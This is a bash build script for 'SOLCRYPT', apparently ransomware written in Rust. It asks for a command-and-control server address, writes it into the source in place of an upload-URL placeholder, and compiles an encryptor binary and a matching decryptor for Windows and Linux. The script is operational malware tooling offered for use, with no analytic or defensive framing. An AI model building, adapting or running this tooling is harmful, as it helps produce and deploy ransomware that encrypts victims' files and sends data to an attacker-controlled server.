#! /bin/bash
echo "SOLCRYPT v. 001"
echo "Build Script v. 001"
echo "[!] Preparing..."
cp src/main.rs src/main.rs.bak
read -p "C2 Server Address: " C2ADDR
sed -i -e "s/uploadurlhere/$C2ADDR/g" src/main.rs
echo "[!] Source ready."
PS3='Please select option:'
options=("Windows" "Linux" "Both" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu --release
            cargo build --bin decryptor --target x86_64-pc-windows-gnu --release
            ;;
        "Linux")
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu --release
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu --release
            ;;
        "Both")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu --release
            cargo build --bin decryptor --target x86_64-pc-windows-gnu --release
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu --release
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu --release
            ;;
        "Quit")
            mv src/main.rs.bak src/main.rs
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
